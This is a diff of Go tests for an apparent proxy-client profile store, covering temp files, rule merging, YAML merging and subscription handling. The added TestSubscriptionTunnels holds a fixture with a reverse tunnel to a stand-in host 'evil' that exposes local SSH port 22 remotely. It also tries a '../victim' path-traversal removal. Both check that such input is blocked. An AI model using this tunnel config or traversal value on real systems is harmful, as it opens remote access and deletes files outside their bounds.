@@ -583,7 +583,7 @@ func TestTornIndexAndUpdateBackoff(t *testing.T) {
 	if err := WriteAtomic(filepath.Join(dir, "x"), []byte("1"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := os.Stat(filepath.Join(dir, "x.tmp")); err == nil {
+	if left, _ := filepath.Glob(filepath.Join(dir, "x.*.tmp")); len(left) > 0 {
 		t.Error("temp file left behind")
 	}
 }
@@ -866,5 +866,71 @@ func TestInsertRule(t *testing.T) {
 	want := []string{"DOMAIN,c.com,DIRECT", "IP-CIDR,10.0.0.0/8,VPN 路由", "DOMAIN,a.com,DIRECT", "IP-CIDR,172.16.0.0/12,VPN", "PROCESS-NAME,ssh,DIRECT", "DOMAIN,b.com,DIRECT"}
 	if !slices.Equal(items.Rules, want) {
 		t.Fatalf("rules %v", items.Rules)
+	}
+}
+
+// TestSubscriptionTunnels: a subscription's reverse tunnels and capture never reach the core, a
+// local profile's do; Remove takes a listed id only.
+func TestSubscriptionTunnels(t *testing.T) {
+	dir := t.TempDir()
+	s, err := Open(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	p, err := s.AddLocal("x", []byte("capture: {mode: tun}\nreverse-tunnels:\n  - {name: t, type: wireguard, server: evil, password: x, forwards: [{remote: '0.0.0.0:2222', local: '127.0.0.1:22'}]}\nproxies: [{name: a, type: http, server: 1.1.1.1, port: 80}]\nrules: [MATCH,DIRECT]\n"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	build := func() map[string]any {
+		b, err := s.Build(false)
+		if err != nil {
+			t.Fatal(err)
+		}
+		var cfg map[string]any
+		if err := yaml.Unmarshal(b, &cfg); err != nil {
+			t.Fatal(err)
+		}
+		return cfg
+	}
+	if cfg := build(); cfg["reverse-tunnels"] == nil {
+		t.Error("a local profile's tunnel dropped")
+	}
+	s.index.Profiles[0].URL = "http://sub"
+	if cfg := build(); cfg["reverse-tunnels"] != nil || cfg["capture"].(map[string]any)["mode"] == "tun" {
+		t.Errorf("a subscription's tunnel or capture kept: %v %v", cfg["reverse-tunnels"], cfg["capture"])
+	}
+	outside := filepath.Join(dir, "victim.yaml")
+	os.WriteFile(outside, []byte("x"), 0o644)
+	if err := s.Remove("../victim"); err == nil {
+		t.Error("Remove of an unlisted id: no error")
+	}
+	if _, err := os.Stat(outside); err != nil {
+		t.Error("Remove deleted a file outside the profiles")
+	}
+	if err := s.Remove(p.ID); err != nil {
+		t.Error(err)
+	}
+	if fi, err := os.Stat(filepath.Join(dir, "profiles", "index.json")); err != nil || fi.Mode().Perm() != 0o600 {
+		t.Errorf("index.json: %v %v", fi.Mode(), err)
+	}
+}
+
+// TestHideRuleKeepsUserRule: hiding a profile rule leaves the user's rule of the same text.
+func TestHideRuleKeepsUserRule(t *testing.T) {
+	cfg := Merge(map[string]any{"rules": []any{"DOMAIN,x.com,DIRECT", "MATCH,DIRECT"}},
+		map[string]any{"prepend-rules": []any{"DOMAIN,x.com,DIRECT"}, "remove-rules": []any{"DOMAIN,x.com,DIRECT"}})
+	if r := cfg["rules"].([]any); !slices.Equal(r, []any{"DOMAIN,x.com,DIRECT", "MATCH,DIRECT"}) {
+		t.Fatalf("%v", r)
+	}
+}
+
+// TestMergeNodeKeyAfterSameValue: a key found among the keys, not a value spelt the same before it.
+func TestMergeNodeKeyAfterSameValue(t *testing.T) {
+	var base, over yaml.Node
+	yaml.Unmarshal([]byte("a: b\nb: 1\n"), &base)
+	yaml.Unmarshal([]byte("b: 2\n"), &over)
+	out, _ := yaml.Marshal(mergeNode(base.Content[0], over.Content[0], false))
+	if string(out) != "a: b\nb: 2\n" {
+		t.Fatalf("%q", out)
 	}
 }
